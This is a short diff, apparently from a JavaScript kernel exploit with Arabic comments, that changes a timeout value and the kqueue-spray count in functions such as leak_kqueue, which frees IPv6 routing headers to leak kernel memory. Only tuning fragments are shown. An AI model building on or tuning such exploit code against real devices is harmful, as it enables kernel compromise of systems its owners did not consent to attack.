@@ -908,7 +908,7 @@ function yield_to_render(callback) {
         show_fail();
       }
     }
-  }, 2); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
+  }, 0); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
 }
 var exploit_count = 0;
 var exploit_end = false;
@@ -1387,7 +1387,7 @@ function leak_kqueue() {
 
   // 2) اعمل free مرة واحدة فقط قبل اللوب
   free_rthdr(ipv6_socks[triplets[1]]);
-  var MAX_KQ = 7000;
+  var MAX_KQ = 4000;
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   for (var i = 0; i < MAX_KQ; i++) {
